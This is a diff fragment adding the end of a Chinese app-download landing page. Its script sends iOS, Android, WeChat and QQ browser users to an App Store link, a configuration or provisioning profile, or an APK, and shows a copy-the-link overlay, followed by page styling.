+</script>
+	<script>
+        $("body").css("cursor","pointer");
+
+        var ua = navigator.userAgent.toLowerCase();
+        var Sys = {};
+        var s;
+        //Sys.safari:是否是safari
+        (s = ua.match(/version\/([\d.]+).*safari/)) ? Sys.safari = s[1] : 0;
+        //是否是微信
+        var isWeiXin = !!(ua.match(/MicroMessenger/i) == 'micromessenger')
+        //是否是苹果设备
+        var is_phone_device = /(iPhone|iPad|iPod|iOS)/i.test(ua);
+        //是否是QQ内置浏览器，qq浏览器
+        var is_qq_browser = ua.indexOf(' qq')>-1 && ua.indexOf('mqqbrowser') <0;
+        //判断设备是否为iPhone
+        if (is_phone_device) {
+            if(isWeiXin || is_qq_browser) {
+              $(function() {
+                $('.wechat-ios').show()
+              });
+            }else {
+                if (Sys.safari) {
+                $(".down").attr("href",'https://apps.apple.com/cn/app/id1002355194');
+
+                    $(".down").click(function(event) {
+                        setTimeout(function(){
+                            if( confirm){
+                                location.href = "app.mobileprovision";
+                            }
+                        },2500)
+                    });
+                    //打开引导弹窗
+                    // $(".doubt").click(function(event) {
+                    //     $(".pup").fadeIn();
+                    //     var swiper = new Swiper('.swiper-container',{
+                    //         loop: true,
+                    //         pagination: {
+                    //             el: '.swiper-pagination',
+                    //         },
+                    //     });
+                    // });
+                }else{
+                     $(".down").attr("href",'../xiazai/ios.mobileconfig');
+
+                    $(".down").click(function(event) {
+                        setTimeout(function(){
+                            if( confirm){
+                                location.href = "app.mobileprovision";
+                            }
+                        },2500)
+                    });
+                    showSafariMask();
+                    // $("body").click(function(event) {
+                    //     $(".pupPic").show();
+                    // });
+                }
+            }
+        }else if(is_qq_browser){//判断是否QQ内置浏览器
+            // $(".down").attr("href",'###');
+            // $("body").click(function(event) {
+            //     $(".pupPic").show();
+            //  });
+            showSafariMask();
+        }else if (/(Android)/i.test(ua)) {//判断Android
+            if(isWeiXin) {
+              $(function() {
+                $('.wechat-android').show()
+              });
+            }
+                            $(".down").attr("href",'../xiazai/apk.apk');
+            //打开引导弹窗
+            $(".doubt").click(function(event) {
+                $(".pup").fadeIn();
+                var swiper = new Swiper('.swiper-container',{
+                    loop: true,
+                    pagination: {
+                        el: '.swiper-pagination',
+                    },
+                });
+            });
+        }
+        //在微信中打开
+        if (isWeiXin) {
+            $(".down").attr("href",'###');
+            $("body").click(function(event) {
+                $(".pupPic").show();
+            });
+        }
+
+		//关闭弹窗
+		$(".colse").click(function(event) {
+			$(".pup").fadeOut();
+		});
+
+        function showSafariMask() {
+            var mask = $('div.wechat-mask');
+            mask.find('.copy-url>input').val(location.href);
+            mask.show();
+        };
+        $(function () {
+            var copyBtn = new ClipboardJS('.copy-url button');
+            copyBtn.on('success', function(e) {
+                alert('链接复制成功，快去Safari中打开吧~');
+                mask.hide();
+            });
+            copyBtn.on('error', function(e) {});
+        });
+
+	</script>
+	<script src="js/mui.js"></script>
+	<script>
+		mui.plusReady(function() {
+			//首页返回键处理
+			//处理逻辑：1秒内，连续两次按返回键，则退出应用；
+			var first = null;
+			plus.key.addEventListener('backbutton', function() {
+				//首次按键，提示‘再按一次退出应用’
+				if (!first) {
+					first = new Date().getTime();
+					// mui.toast('再按一次退出应用');
+					setTimeout(function() {
+						first = null;
+					}, 1000);
+				} else {
+					if (new Date().getTime() - first < 1000) {
+						plus.runtime.quit();
+					}
+				}
+			}, false);
+		});
+	</script>
+  <style>
+    .wechat-ios, .wechat-android{
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      z-index: 9999;
+      display: none;
+      overflow: hidden;
+    }
+    .wechat-ios img, .wechat-android img{
+      width: 100%;
+      height: 100%;
+    }
+    .wechat-mask .mask-bg {
+        position: fixed;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        background: rgba(0, 0, 0, .2);
+    }
+    .wechat-mask .mask-pop {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        width: 80%;
+        max-width: 300px;
+        transform: translate(-50%, -50%);
+        background: #fff;
+        border-radius: 20px;
+        overflow: hidden;
+    }
+    .wechat-mask .copy-url-img {
+        display: block;
+        width: 100%;
+    }
+    .wechat-mask .copy-url {
+        position: relative;
+        margin: 20px 30px;
+        height: 36px;
+        line-height: 36px;
+        background: #F1F6F9;
+        border-radius: 18px;
+        overflow: hidden;
+    }
+    .wechat-mask .copy-url input {
+        padding-left: 20px;
+        color: #9A9A99;
+    }
+    .wechat-mask .copy-url button {
+        position: absolute;
+        right: 0;
+        top: 0;
+        padding: 0 15px;
+        height: 36px;
+        line-height: 36px;
+        background: linear-gradient(90deg, rgba(34, 125, 249, 1), rgba(0, 203, 250, 1));
+        color: #fff;
+        border-radius: 0 18px 18px 0;
+    }
+    .wechat-mask {
+        z-index: 2;
+        position: relative;
+        display: block;
+    }
+  </style>
+</body>
+</html>
